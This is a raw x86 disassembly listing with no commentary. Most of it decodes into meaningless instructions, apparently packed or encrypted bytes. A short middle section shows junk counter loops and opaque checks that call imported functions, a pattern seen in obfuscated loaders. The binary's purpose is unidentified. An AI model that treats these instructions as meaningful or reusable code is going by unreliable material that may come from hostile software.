  403069:	fld    TBYTE PTR [eax+0x68]
  40306c:	aas    
  40306d:	or     eax,0xa6926065
  403072:	xor    al,BYTE PTR [ecx]
  403074:	mov    esi,0x613816ba
  403079:	mov    al,0x36
  40307b:	(bad)  
  40307c:	(bad)  
  40307d:	(bad)  
  40307e:	lods   eax,DWORD PTR ds:[esi]
  40307f:	aad    0xbc
  403081:	mul    DWORD PTR [ebx-0xa]
  403084:	test   al,0xb5
  403086:	leave  
  403087:	or     DWORD PTR ds:0x9797bd45,edx
  40308d:	and    cl,0x29
  403090:	sbb    BYTE PTR [ecx],cl
  403092:	adc    ah,al
  403094:	cwde   
  403095:	loopne 0x40309b
  403097:	shl    BYTE PTR [ebx],cl
  403099:	popf   
  40309a:	into   
  40309b:	or     esi,esp
  40309d:	fwait
  40309e:	test   eax,0x6e2613d0
  4030a3:	sub    eax,0x96a54840
  4030a8:	inc    eax
  4030a9:	pop    eax
  4030aa:	mov    ah,0xc0
  4030ac:	or     eax,0xddad198e
  4030b1:	xchg   ebp,eax
  4030b2:	dec    BYTE PTR [ecx]
  4030b4:	pop    eax
  4030b5:	add    DWORD PTR [edi+0x6d],0x387cc874
  4030bc:	mov    al,BYTE PTR [ebp-0x6d428afb]
  4030c2:	mov    edx,0x8f7ec8ac
  4030c7:	cmp    esi,DWORD PTR [esp+edi*1-0x576287b3]
  4030ce:	fild   WORD PTR [ebx-0x12]
  4030d1:	retf   0x1373
  4030d4:	sbb    edi,DWORD PTR [edi+0x23]
  4030d7:	fidiv  DWORD PTR [eax-0x5d2ca124]
  4030dd:	retf   0x1938
  4030e0:	in     eax,0x54
  4030e2:	mov    ebx,DWORD PTR [edx+eax*4-0x53]
  4030e6:	pop    eax
  4030e7:	clc    
  4030e8:	retf   0xb4f0
  4030eb:	lods   al,BYTE PTR ds:[esi]
  4030ec:	sbb    DWORD PTR ds:[ecx-0x67],0x42ed77f0
  4030f4:	dec    ecx
  4030f5:	sub    ebp,DWORD PTR [eax+0x76]
  4030f8:	das    
  4030f9:	mov    bl,BYTE PTR [esi+0x4e37f826]
  4030ff:	cmc    
  403100:	pop    ebx
  403101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403102:	ins    BYTE PTR es:[edi],dx
  403103:	aaa    
  403104:	jae    0x4030d5
  403106:	mov    BYTE PTR [ecx],bl
  403108:	iret   
  403109:	xor    BYTE PTR [edx-0x25],0xe2
  40310d:	lds    esi,FWORD PTR [esi-0x28e4d232]
  403113:	xor    al,0xa9
  403115:	je     0x4030d7
  403117:	mov    dl,cl
  403119:	and    al,0xf2
  40311b:	rol    BYTE PTR [ebx-0x3],cl
  40311e:	mov    al,0x13
  403120:	dec    eax
  403121:	sub    eax,0x77a62b7a
  403126:	jb     0x40318e
  403128:	stos   DWORD PTR es:[edi],eax
  403129:	test   eax,0xba53e4bd
  40312e:	mov    edi,DWORD PTR [ebx]
  403130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403131:	lahf   
  403132:	arpl   WORD PTR [edi-0x4cc15941],bx
  403138:	imul   edi,DWORD PTR [edx],0x71de8549
  40313e:	das    
  40313f:	test   BYTE PTR [ecx+edi*1],dh
  403142:	push   ebx
  403143:	repz inc edi
  403145:	dec    ecx
  403146:	pop    edx
  403147:	adc    edx,esp
  403149:	fwait
  40314a:	add    dl,BYTE PTR [ecx]
  40314c:	dec    esp
  40314d:	mov    edx,DWORD PTR [eax]
  40314f:	cmp    ebp,esp
  403151:	adc    al,bh
  403153:	push   edi
  403154:	push   ecx
  403155:	jne    0x40315b
  403157:	jmp    0x403137
  403159:	call   0xf6a28f86
  40315e:	push   edi
  40315f:	dec    ecx
  403160:	jge    0x4031cc
  403162:	sub    dl,BYTE PTR [ecx]
  403164:	push   ecx
  403165:	enter  0x6807,0xf3
  403169:	repz sub al,0x84
  40316c:	cmp    BYTE PTR [edx],dh
  40316e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40316f:	xchg   edx,eax
  403170:	add    bl,bh
  403172:	pop    ebp
  403173:	imul   ecx,DWORD PTR [ebx-0x60],0x2bc817b1
  40317a:	inc    edi
  40317b:	mov    ebp,0x14e0aeaa
  403180:	lods   al,BYTE PTR ds:[esi]
  403181:	mov    WORD PTR [ecx+0x59],ss
  403184:	or     bh,bl
  403186:	jb     0x4031b8
  403188:	xchg   ebp,eax
  403189:	dec    edx
  40318a:	pop    esi
  40318b:	mov    gs,WORD PTR [eax-0x295723bd]
  403191:	pop    ds
  403192:	jl     0x4031b2
  403194:	add    ah,dh
  403196:	and    edx,esp
  403198:	shl    BYTE PTR [edx-0x5c],1
  40319b:	add    al,0x5b
  40319d:	inc    edi
  40319e:	(bad)  
  40319f:	mov    DWORD PTR [edi],esp
  4031a1:	xchg   edi,eax
  4031a2:	xor    ecx,DWORD PTR [eax-0x6e]
  4031a5:	jmp    0xda253f22
  4031aa:	out    0xea,al
  4031ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031ad:	add    edx,DWORD PTR [eax-0x68]
  4031b0:	xchg   esi,ebp
  4031b2:	repnz dec ebx
  4031b4:	jno    0x403166
  4031b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031b7:	retf   0x3523
  4031ba:	ret    0x9adf
  4031bd:	scas   eax,DWORD PTR es:[edi]
  4031be:	add    esi,DWORD PTR [ecx]
  4031c0:	out    0x7,eax
  4031c2:	xchg   BYTE PTR [edx-0x2f472c9c],cl
  4031c8:	cwde   
  4031c9:	fwait
  4031ca:	pop    ss
  4031cb:	rcl    BYTE PTR ds:[eax-0xe],cl
  4031cf:	fs pop ss
  4031d1:	pop    eax
  4031d2:	mov    edi,0xf5ac9ffa
  4031d7:	xchg   esi,eax
  4031d8:	jl     0x403207
  4031da:	dec    ebx
  4031db:	ficom  DWORD PTR [esi+0x29]
  4031de:	inc    ebp
  4031df:	into   
  4031e0:	(bad)  
  4031e1:	fiadd  WORD PTR ds:0xcc820256
  4031e7:	adc    eax,0x4a093f91
  4031ec:	push   ss
  4031ed:	cdq    
  4031ee:	jg     0x403231
  4031f0:	cmp    BYTE PTR [esp+ebx*1+0x401dffdc],cl
  4031f7:	ficomp WORD PTR [ecx+0x21fc8279]
  4031fd:	call   0xfc91:0x760facc7
  403204:	jge    0x403262
  403206:	idiv   BYTE PTR [ecx+0x67]
  403209:	sub    bh,BYTE PTR [ebx+esi*4-0x29]
  40320d:	sbb    edi,edi
  40320f:	pop    eax
  403210:	mov    al,ds:0x909ec5e4
  403215:	imul   esi,DWORD PTR [eax-0x61],0x48
  403219:	stos   DWORD PTR es:[edi],eax
  40321a:	sub    ebp,DWORD PTR [ebp-0x33]
  40321d:	(bad)  
  40321e:	xchg   ecx,eax
  40321f:	cld    
  403220:	pop    eax
  403221:	mov    ds:0xa8d884f7,al
  403226:	repnz pop esi
  403228:	repnz push ebx
  40322a:	push   edi
  40322b:	stc    
  40322c:	sub    eax,0x20708d04
  403231:	aaa    
  403232:	or     dl,0xdd
  403235:	adc    ah,BYTE PTR [eax+0x42]
  403238:	pop    esi
  403239:	push   esp
  40323a:	cwde   
  40323b:	inc    esi
  40323c:	sahf   
  40323d:	std    
  40323e:	mov    WORD PTR [eax+0x695dc7f6],?
  403244:	dec    eax
  403245:	jg     0x403219
  403247:	push   es
  403248:	hlt    
  403249:	ret    
  40324a:	push   edx
  40324b:	adc    ebp,DWORD PTR [ebx+ecx*2]
  40324e:	mov    ebp,0xb5eb999e
  403253:	add    BYTE PTR [esi+esi*2-0x773cb54e],bh
  40325a:	push   ecx
  40325b:	xchg   edx,eax
  40325c:	adc    bh,BYTE PTR [edi]
  40325e:	rcr    DWORD PTR [ebx-0x27829716],cl
  403264:	enter  0xc574,0xd1
  403268:	test   eax,0xbb4ed6be
  40326d:	xchg   esi,eax
  40326e:	cld    
  40326f:	dec    esi
  403270:	clc    
  403271:	jae    0x4032d8
  403273:	xor    al,0xe0
  403275:	adc    eax,0x243d4291
  40327a:	clc    
  40327b:	inc    esp
  40327c:	arpl   WORD PTR ds:0x5b103ea3,di
  403282:	leave  
  403283:	ret    0xc
  403286:	push   ebp
  403287:	mov    ebp,esp
  403289:	sub    esp,0x14
  40328c:	leave  
  40328d:	ret    0x4
  403290:	push   ebp
  403291:	mov    ebp,esp
  403293:	push   ecx
  403294:	push   ecx
  403295:	neg    ecx
  403297:	mov    eax,0xf89c8535
  40329c:	and    DWORD PTR ds:0x433617,0x0
  4032a6:	mov    edx,DWORD PTR ds:0x433617
  4032ac:	inc    edx
  4032ad:	mov    DWORD PTR ds:0x433617,edx
  4032b3:	cmp    DWORD PTR ds:0x433617,0x6
  4032ba:	jne    0x4032d5
  4032c0:	push   0x8ffb
  4032c5:	push   0x6662
  4032ca:	push   0x4336ed
  4032cf:	call   DWORD PTR ds:0x412180
  4032d5:	cmp    DWORD PTR ds:0x433617,0x5
  4032dc:	jne    0x4032ef
  4032e2:	mov    edx,DWORD PTR ds:0x433617
  4032e8:	inc    edx
  4032e9:	mov    DWORD PTR ds:0x433617,edx
  4032ef:	cmp    DWORD PTR ds:0x433617,0x11
  4032f6:	jb     0x4032a6
  4032fc:	mov    DWORD PTR [ebp-0x8],eax
  4032ff:	sbb    DWORD PTR ds:0x43359b,edi
  403305:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40330c:	mov    DWORD PTR ds:0x43365b,0x7030
  403316:	mov    edx,DWORD PTR [ebp-0x8]
  403319:	and    DWORD PTR ds:0x4335f3,0x0
  403323:	xor    ecx,ecx
  403325:	or     ecx,DWORD PTR ds:0x4335f3
  40332b:	inc    ecx
  40332c:	mov    DWORD PTR ds:0x4335f3,ecx
  403332:	cmp    DWORD PTR ds:0x4335f3,0x1f
  403339:	jne    0x403361
  40333f:	push   0x433657
  403344:	push   0x433623
  403349:	push   DWORD PTR [ebp-0xc]
  40334c:	push   0x4337cc
  403351:	push   0x4336ca
  403356:	push   0x433767
  40335b:	call   DWORD PTR ds:0x412184
  403361:	cmp    DWORD PTR ds:0x4335f3,0x13
  403368:	jb     0x403323
  40336e:	mov    DWORD PTR ds:0x43355b,0x1f
  403378:	cmp    DWORD PTR ds:0x43355b,0x0
  40337f:	je     0x4033d1
  403385:	cmp    DWORD PTR ds:0x43355b,0x4
  40338c:	jne    0x40339d
  403392:	push   0x4335eb
  403397:	call   DWORD PTR ds:0x412188
  40339d:	cmp    DWORD PTR ds:0x43355b,0x5
  4033a4:	jne    0x4033b9
  4033aa:	xor    ecx,ecx
  4033ac:	xor    ecx,DWORD PTR ds:0x43355b
  4033b2:	dec    ecx
  4033b3:	mov    DWORD PTR ds:0x43355b,ecx
  4033b9:	mov    ecx,DWORD PTR ds:0x43355b
  4033bf:	dec    ecx
  4033c0:	mov    DWORD PTR ds:0x43355b,ecx
  4033c6:	jmp    0x403378
  4033cb:	and    DWORD PTR ds:0x4335e3,ecx
  4033d1:	push   esi
  4033d2:	mov    ecx,0x7510853
  4033d7:	xor    edx,ecx
  4033d9:	mov    esi,0x32729a
  4033de:	adc    DWORD PTR ds:0x43362b,0x4fea
  4033e8:	push   edi
  4033e9:	sub    DWORD PTR ds:0x4335db,0x417a
  4033f3:	mov    edi,DWORD PTR [ebp+0x10]
  4033f6:	add    edx,esi
  4033f8:	cmp    edi,edx
  4033fa:	je     0x403eaf
  403400:	jmp    0x40360c
  403405:	adc    DWORD PTR [edi+0x6fb6ef04],esp
  40340b:	icebp  
  40340c:	popa   
  40340d:	mov    WORD PTR [ebx],?
  40340f:	push   edi
  403410:	inc    esp
  403411:	xchg   edi,eax
  403412:	inc    esi
  403413:	inc    ebx
  403414:	mov    bh,0x16
  403416:	adc    edi,DWORD PTR [esp+edi*2+0x6d]
  40341a:	jg     0x403498
  40341c:	jl     0x4033e1
  40341e:	ss ins DWORD PTR es:[edi],dx
  403420:	jo     0x4033e9
  403422:	mov    eax,0x9a958b68
  403427:	ins    DWORD PTR es:[edi],dx
  403428:	cmc    
  403429:	or     cl,dl
  40342b:	jae    0x4033f4
  40342d:	push   ds
  40342e:	aam    0x9a
  403430:	ja     0x4033ce
  403432:	loopne 0x403454
  403434:	or     eax,0xa6b83ae3
  403439:	repz sbb ebp,DWORD PTR [edx]
  40343c:	call   0x892e:0x47cf325d
  403443:	lds    edx,FWORD PTR [esi+0x6f]
  403446:	retf   
  403447:	xor    al,0x83
  403449:	lds    esi,FWORD PTR [edi-0x2]
  40344c:	adc    al,0xf2
  40344e:	popf   
  40344f:	mov    ch,0xcf
  403451:	and    dl,ah
  403453:	pusha  
  403454:	in     al,dx
  403455:	sub    eax,0x3f6b1b3e
  40345a:	push   0x38
  40345c:	out    0xde,al
  40345e:	mov    esp,0x58f659b0
  403463:	jnp    0x4034b7
  403465:	ficomp DWORD PTR [ecx+0x1a]
  403468:	adc    DWORD PTR [eax+ebx*1-0x3087eaac],0x9e14abef
  403473:	push   edx
  403474:	pop    ebp
  403475:	jp     0x40341e
  403477:	in     eax,0xc9
  403479:	sub    BYTE PTR [edx],0x47
  40347c:	sub    al,0x82
  40347e:	xor    BYTE PTR [ecx+0x2d],0x29
  403482:	les    eax,FWORD PTR [ebx-0x40f5343]
  403488:	mov    al,0x38
  40348a:	mov    bh,0x82
  40348c:	push   ecx
  40348d:	and    DWORD PTR [ecx-0x286bca32],0xffffffb2
  403494:	clc    
  403495:	mov    cl,bl
  403497:	mov    bh,0x49
  403499:	pop    edx
  40349a:	ud2    
  40349c:	and    ah,ch
  40349e:	cmc    
  40349f:	jp     0x403490
  4034a1:	les    edi,FWORD PTR [eax]
  4034a3:	xor    bh,BYTE PTR [ecx]
  4034a5:	xchg   ebx,eax
  4034a6:	dec    ecx
  4034a7:	repz adc al,0x3
  4034aa:	nop
  4034ab:	fbld   TBYTE PTR fs:0xa5cbfbbb
  4034b2:	mov    ecx,DWORD PTR [ebx+0x15]
  4034b5:	push   edi
  4034b6:	int3   
  4034b7:	ins    DWORD PTR es:[edi],dx
  4034b8:	js     0x40349e
  4034ba:	push   cs
  4034bb:	hlt    
  4034bc:	call   0x9f37178
  4034c1:	dec    esp
  4034c2:	inc    ebx
  4034c3:	gs inc ebp
  4034c5:	dec    ecx
  4034c6:	mov    esp,eax
  4034c8:	mov    ecx,0x2c91db6
  4034cd:	mov    WORD PTR [ecx+0x8],ss
  4034d0:	mov    ds:0x374bad3e,al
  4034d5:	sahf   
  4034d6:	pop    es
  4034d7:	(bad)  
  4034d8:	fldcw  WORD PTR [esi]
  4034da:	int    0x27
  4034dc:	not    dl
  4034de:	scas   al,BYTE PTR es:[edi]
  4034df:	jne    0x40347c
  4034e1:	cmp    ch,al
  4034e3:	stos   DWORD PTR es:[edi],eax
  4034e4:	jno    0x40347c
  4034e6:	scas   al,BYTE PTR es:[edi]
  4034e7:	dec    edi
  4034e8:	dec    BYTE PTR [ebp+esi*8-0x46]
  4034ec:	pop    ecx
  4034ed:	rol    DWORD PTR ds:0x1723b292,1
  4034f3:	inc    ecx
  4034f4:	sbb    al,0xe2
  4034f6:	(bad)  
  4034f7:	out    0xb9,al
  4034f9:	sti    
  4034fa:	hlt    
  4034fb:	jne    0x40350d
  4034fd:	jo     0x4034f2
  4034ff:	xchg   ebp,eax
  403500:	enter  0xbaad,0x23
  403504:	fisttp DWORD PTR [ecx+edx*2+0x687b1445]
  40350b:	imul   BYTE PTR [esi+0x73e9404d]
  403511:	xchg   ebp,eax
  403512:	mov    eax,ds:0x371f5eb2
  403517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403518:	and    bl,0x63
  40351b:	sahf   
  40351c:	jp     0x403524
  40351e:	fsub   st(5),st
  403520:	in     eax,0x46
  403522:	outs   dx,BYTE PTR ds:[esi]
  403523:	in     al,dx
  403524:	push   0xffffff82
  403526:	nop
  403527:	mov    esp,0x5918d89d
  40352c:	dec    ebp
  40352d:	dec    eax
  40352e:	cmc    
  40352f:	push   ebp
  403530:	pusha  
  403531:	aam    0x70
  403533:	add    eax,0x67a8a4c0
  403538:	(bad)  
  403539:	xchg   BYTE PTR ss:[edx],dl
  40353c:	fidiv  WORD PTR [esi+0x76605b11]
  403542:	jle    0x403546
  403544:	mov    dl,0x2f
  403546:	cmp    BYTE PTR [edi+edi*4],bh
  403549:	xor    al,cl
  40354b:	mov    ah,0xbc
  40354d:	mov    esi,0xb459243e
  403552:	lea    esi,[eax+0x3]
  403555:	add    eax,0x556fb3b8
  40355a:	test   eax,0xabd3e37a
  40355f:	loop   0x403543
  403561:	mov    esi,0x2fcab766
  403566:	jmp    0x4035ac
  403568:	aas    
  403569:	push   edi
  40356a:	pop    eax
  40356b:	jns    0x403523
  40356d:	bound  esp,QWORD PTR [edx]
  40356f:	cmp    DWORD PTR [esi+ecx*4],ebx
  403572:	mov    edx,DWORD PTR [esi]
  403574:	arpl   cx,bx
  403576:	into   
  403577:	in     al,0x3c
  403579:	out    dx,al
  40357a:	into   
  40357b:	cli    
  40357c:	jo     0x4035ea
  40357e:	jne    0x4035f8
  403580:	add    al,al
  403582:	mov    edi,0x742d1e54
  403587:	mov    eax,ds:0x65717463
  40358c:	ror    ah,1
  40358e:	jp     0x403599
  403590:	pop    esi
  403591:	pop    esi
  403592:	xor    al,0x47
  403594:	(bad)  
  403595:	lds    esi,FWORD PTR gs:[esi+0x6d5ec549]
  40359c:	mov    esi,0x565cc65
  4035a1:	jae    0x403603
  4035a3:	cwde   
  4035a4:	add    al,0x59
  4035a6:	stc    
  4035a7:	repnz nop
  4035a9:	in     al,0x83
  4035ab:	xor    al,0xf6
  4035ad:	mov    bh,0x34
  4035af:	sbb    edi,DWORD PTR [eax-0x61448207]
  4035b5:	vpacksswb xmm3,xmm1,xmm1
  4035b9:	test   al,0xf0
  4035bb:	push   edi
  4035bc:	loopne 0x4035ee
  4035be:	xchg   ecx,eax
  4035bf:	mov    ds:0xab1fd864,eax
  4035c4:	ds test al,0x20
  4035c7:	arpl   WORD PTR [ebx+0x17],si
  4035ca:	cli    
  4035cb:	adc    eax,0xa57fa9a8
  4035d0:	adc    eax,0x2a1ed138
  4035d5:	xor    DWORD PTR [ebp+0x3e230531],0xbe44ba47
  4035df:	dec    ebx
  4035e0:	and    eax,0x7d82249
  4035e5:	inc    edi
  4035e6:	dec    ebp
  4035e7:	jmp    0x79a3237f
  4035ec:	scas   al,BYTE PTR es:[edi]
  4035ed:	(bad)  
  4035ef:	scas   al,BYTE PTR es:[edi]
  4035f0:	mov    dh,0x79
  4035f2:	sub    ah,BYTE PTR [ebx]
  4035f4:	icebp  
  4035f5:	mov    ebp,DWORD PTR [edi]
  4035f7:	mov    eax,0x3fd1d8d2
  4035fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035fd:	pop    esp
  4035fe:	cli    
  4035ff:	dec    esp
  403600:	pop    eax
  403601:	mov    cl,BYTE PTR [edi-0x645b33ee]
  403607:	stc    
  403608:	dec    edi
  403609:	pop    ds
  40360a:	pusha  
  40360b:	mov    dh,0x8b
  40360d:	push   ebp
  40360e:	clc    
  40360f:	mov    eax,DWORD PTR [ebp-0x4]
  403612:	xor    eax,ecx
  403614:	mov    edi,0xffcd8d66
  403619:	sub    edi,eax
  40361b:	add    edi,DWORD PTR [ebp+0x10]
  40361e:	xor    edx,ecx
  403620:	add    edx,esi
  403622:	cmp    edx,edi
  403624:	ja     0x403eaa
  40362a:	push   ebx
  40362b:	jmp    0x403841
  403630:	mov    esi,0x32729a
  403635:	jmp    0x403841
  40363a:	sbb    dh,BYTE PTR [eax+ebx*8+0x727272b6]
  403641:	mov    al,0x9c
  403643:	outs   dx,DWORD PTR ds:[esi]
  403644:	call   0xaa53f476
  403649:	loopne 0x403652
  40364b:	sbb    eax,0x7f6d7c7c
  403650:	jl     0x4036ce
  403652:	sbb    DWORD PTR [eax-0x6e],ebx
  403655:	fnstenv [ebp+edi*1-0x63]
  403659:	fadd   QWORD PTR es:[edx]
  40365c:	cmp    bl,dl
  40365e:	add    eax,0xd581510f
  403663:	cld    
  403664:	inc    edx
  403665:	cmp    bl,ah
  403667:	sahf   
  403668:	(bad)  
  403669:	in     al,0xb4
  40366b:	add    eax,0x26835380
  403670:	fs pop eax
  403672:	out    0x99,eax
  403674:	lods   al,BYTE PTR ds:[esi]
  403675:	mov    eax,ds:0x9bb6dc0c
  40367a:	icebp  
  40367b:	out    dx,al
  40367c:	arpl   dx,cx
  40367e:	xchg   edi,eax
  40367f:	jnp    0x4036dc
  403681:	dec    esi
  403682:	xor    ecx,eax
  403684:	(bad)  
  403685:	pop    esp
  403686:	cwde   
  403687:	icebp  
  403688:	ret    
  403689:	cmp    ebp,DWORD PTR ds:0xaf20541a
  40368f:	sahf   
  403690:	or     cl,al
  403692:	ret    0xb6be
  403695:	push   edi
  403696:	or     ah,BYTE PTR [ecx]
  403698:	pop    ebp
  403699:	xchg   ebx,eax
  40369a:	mov    bh,0x55
  40369c:	xor    eax,0x1c750e64
  4036a1:	and    ebx,DWORD PTR ds:[ebx+0x51a1abe6]
  4036a8:	ror    BYTE PTR [esi-0x2c],cl
  4036ab:	sub    eax,0x2c7488ff
  4036b0:	in     al,dx
  4036b1:	xor    DWORD PTR [ebx-0x75cc670f],edi
  4036b7:	mov    BYTE PTR [ebx+0xb],dl
  4036ba:	or     ebx,edi
  4036bc:	xor    ah,dh
  4036be:	mov    ds:0xd99f514b,eax
  4036c3:	fwait
  4036c4:	xor    bh,BYTE PTR [eax+0x42]
  4036c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036c8:	sbb    DWORD PTR [ecx+0x4b],esp
  4036cb:	stos   BYTE PTR es:[edi],al
  4036cc:	outs   dx,BYTE PTR ds:[esi]
  4036cd:	fstp   st(6)
  4036cf:	imul   edx,DWORD PTR ds:0x31b3a8c9,0x1e
  4036d6:	cwde   
  4036d7:	jp     0x403697
  4036d9:	sahf   
  4036da:	or     al,BYTE PTR [ecx-0x2746c715]
  4036e0:	int3   
  4036e1:	push   cs
  4036e2:	int3   
  4036e3:	cmp    al,0x63
  4036e5:	push   esp
  4036e6:	jnp    0x403668
  4036e8:	push   es
  4036e9:	mov    ebx,DWORD PTR [eax]
  4036eb:	fsub   QWORD PTR ds:0xf01e3356
  4036f1:	(bad)  
  4036f2:	xor    eax,DWORD PTR [edx]
  4036f4:	or     esp,esp
  4036f6:	data16 cmc 
  4036f8:	in     eax,0xf5
  4036fa:	sub    eax,0x30534236
  4036ff:	call   0x265ca330
  403704:	mov    edi,0xc600779e
  403709:	adc    edi,eax
  40370b:	(bad)  [ebx+ebp*8+0x73]
  40370f:	add    DWORD PTR [eax],ebx
  403711:	mov    eax,0x516940f1
  403716:	add    edx,DWORD PTR [eax-0x7af32d26]
  40371c:	mov    cl,0x7a
  40371e:	cdq    
  40371f:	mov    esp,DWORD PTR gs:[edx-0x7f407b35]
  403726:	fild   QWORD PTR [edx+0x1f62c425]
  40372c:	rcr    BYTE PTR [bp+di+0x2160],0x36
  403732:	cmp    DWORD PTR [ecx],edx
  403734:	cmp    eax,DWORD PTR [eax+0x36]
  403737:	sub    ecx,ebx
  403739:	and    al,0x40
  40373b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40373c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40373d:	add    ebx,ebp
  40373f:	or     eax,0x67
  403742:	dec    edi
  403743:	test   BYTE PTR [eax+0x11],ah
  403746:	add    esp,esi
  403748:	or     ebp,DWORD PTR ds:0x551723c0
  40374e:	mov    ch,0x97
  403750:	mov    bh,0x79
  403752:	(bad)  
  403753:	arpl   cx,di
  403755:	xchg   DWORD PTR ds:0x4e9bac5d,ebx
  40375b:	jge    0x4036e5
  40375d:	stc    
  40375e:	xchg   edx,eax
  40375f:	fidivr DWORD PTR [esi+0x6a]
  403762:	cmp    BYTE PTR ds:0xbaef4c2f,bh
  403768:	mov    ecx,0x88c97322
  40376d:	call   0x68c1900a
  403772:	add    bl,BYTE PTR [ebx+0x21bd25e4]
  403778:	lds    esi,FWORD PTR [ecx+0x7b]
  40377b:	adc    eax,0x120b74bf
  403780:	test   bl,ch
  403782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403783:	dec    ebp
  403784:	lods   eax,DWORD PTR ds:[esi]
  403785:	das    
  403786:	cmp    eax,0x9e15adbd
  40378b:	cmp    al,0x27
  40378d:	push   ecx
  40378e:	shr    BYTE PTR [esi],0x81
  403791:	mov    dl,0x7c
  403793:	(bad)
  403796:	dec    edi
  403797:	add    DWORD PTR [ebx+eax*2+0x15913c6d],0x129fb143
  4037a2:	int3   
  4037a3:	mov    edi,0xa512c838
  4037a8:	mov    al,ds:0x9fbb83d8
  4037ad:	pop    ss
  4037ae:	into   
  4037af:	push   es
  4037b0:	aaa    
  4037b1:	popa   
  4037b2:	cdq    
  4037b3:	test   dh,dl
  4037b5:	outs   dx,BYTE PTR ds:[esi]
  4037b6:	(bad)  
  4037b7:	push   eax
  4037b8:	imul   eax,ecx,0xddc549e7
  4037be:	jmp    0x2b2b2505
  4037c3:	je     0x40375b
  4037c5:	out    0x12,al
  4037c7:	jno    0x4037b4
  4037c9:	mov    bl,0x77
  4037cb:	bound  edi,QWORD PTR [ecx+0x26]
  4037ce:	pop    es
  4037cf:	cli    
  4037d0:	pop    edx
  4037d1:	imul   ebx,DWORD PTR [eax],0xffffffa9
  4037d4:	jns    0x4037a8
  4037d6:	fnstsw WORD PTR [edi]
  4037d8:	fmul   DWORD PTR [edx]
  4037da:	mov    BYTE PTR [ebp+0x3ea5172c],al
  4037e0:	dec    ebx
  4037e1:	fs ds out dx,al
  4037e4:	jl     0x403788
  4037e6:	and    ah,BYTE PTR [ebx-0x1974da17]
  4037ec:	icebp  
  4037ed:	xor    DWORD PTR [ecx],ebp
  4037ef:	pop    esi
  4037f0:	dec    esi
  4037f1:	retf   0xa912
  4037f4:	xchg   BYTE PTR [edi-0x3b],dl
  4037f7:	ja     0x40378a
  4037f9:	loop   0x4037ed
  4037fb:	dec    esp
  4037fc:	xlat   BYTE PTR ds:[ebx]
  4037fd:	push   cs
  4037fe:	shr    BYTE PTR [ecx+0x76193c2],0x6f
  403805:	dec    eax
  403806:	cmp    BYTE PTR [eax],ch
  403808:	test   al,0x54
  40380a:	pushf  
  40380b:	push   ecx
  40380c:	sbb    ecx,DWORD PTR [edx-0x66]
  40380f:	int    0x96
  403811:	out    dx,eax
  403812:	lods   al,BYTE PTR ds:[esi]
  403813:	inc    edx
  403814:	cs sbb al,0x90
  403818:	inc    edx
  403819:	fdiv   DWORD PTR [bp-0x1e96]
  40381e:	mov    cl,0x7d
  403820:	aaa    
  403821:	inc    ebp
  403822:	pop    edx
  403823:	retf   
  403824:	cdq    
  403825:	shr    eax,1
  403827:	adc    eax,0x405638d3
  40382c:	jecxz  0x403852
  40382e:	sbb    al,0x50
  403830:	cmp    BYTE PTR [edx-0x31824230],ch
  403836:	call   FWORD PTR [ebp+ebp*4+0x6b]
  40383a:	add    al,0xec
  40383c:	jo     0x403848
  40383e:	or     edx,ebp
  403840:	cmp    ecx,DWORD PTR [ebx+0x7e9f845]
  403846:	add    al,BYTE PTR [eax]
  403848:	add    al,dl
  40384a:	mov    esi,0x5d5dd03b
  40384f:	sar    DWORD PTR [esi+0x4bfdbe82],cl
  403855:	sbb    BYTE PTR [edx-0x55],ch
  403858:	jnp    0x4038ce
  40385a:	sbb    al,0x7c
  40385c:	jl     0x4038cb
  40385e:	jg     0x4038dc
  403860:	jl     0x40380b
  403862:	xchg   edx,eax
  403863:	jns    0x40380c
  403865:	jl     0x4038d0
  403867:	mov    DWORD PTR [edi+0x4b51f3f2],edx
  40386d:	les    ebp,FWORD PTR [edi-0x33]
  403870:	loop   0x4038ea
  403872:	mov    ebx,?
  403874:	pusha  
  403875:	push   ebp
  403876:	sbb    dl,BYTE PTR [eax-0x58]
  403879:	inc    edi
  40387a:	aad    0x63
  40387c:	mov    edi,0x84d78a4c
  403881:	pop    eax
  403882:	mov    bl,ch
  403884:	sub    DWORD PTR [ecx],ebp
  403886:	repnz xchg esp,eax
  403888:	test   BYTE PTR [esi+0x36],bh
  40388b:	ficomp DWORD PTR [eax+esi*8-0x2e2b79d]
  403892:	retf   
  403893:	stos   DWORD PTR es:[edi],eax
  403894:	xor    esp,eax
  403896:	enter  0xea01,0x8d
  40389a:	mov    esp,0x2de95e92
  40389f:	add    BYTE PTR [edi],dh
  4038a1:	xchg   ebp,eax
  4038a2:	xor    DWORD PTR [eax+0x19],eax
  4038a5:	mov    edx,0x15439c8a
  4038aa:	jb     0x403907
  4038ac:	or     ah,0xea
  4038af:	call   0xcd93:0xf8ea3094
  4038b6:	adc    edx,DWORD PTR [edx-0x5fafdb31]
  4038bc:	call   0x44eba0e1
  4038c1:	pop    ss
  4038c2:	repz push edx
  4038c4:	add    eax,0xed7216bd
  4038c9:	inc    ebp
  4038ca:	fcomi  st,st(7)
  4038cc:	fnsave [esi-0x387012a2]
  4038d2:	push   ds
  4038d3:	sub    BYTE PTR [edx+0x58],dh
  4038d6:	mov    eax,0xfaf3a3c1
  4038db:	in     al,0xba
  4038dd:	mov    BYTE PTR [ebx],bh
  4038df:	xchg   DWORD PTR [edi-0x3f258c4e],esp
  4038e5:	test   al,0x94
  4038e7:	call   0x10c8c27b
  4038ec:	pop    ss
  4038ed:	fwait
  4038ee:	xor    eax,0xaf409ccc
  4038f3:	mov    ebx,ecx
  4038f5:	jp     0x403906
  4038f7:	fidivr DWORD PTR [esi+0x5e]
  4038fa:	test   esp,ecx
  4038fc:	mov    ebx,0x4987c3bc
  403901:	xor    BYTE PTR [eax],ah
  403903:	mov    DWORD PTR [edi+0x23],edx
  403906:	sbb    al,ch
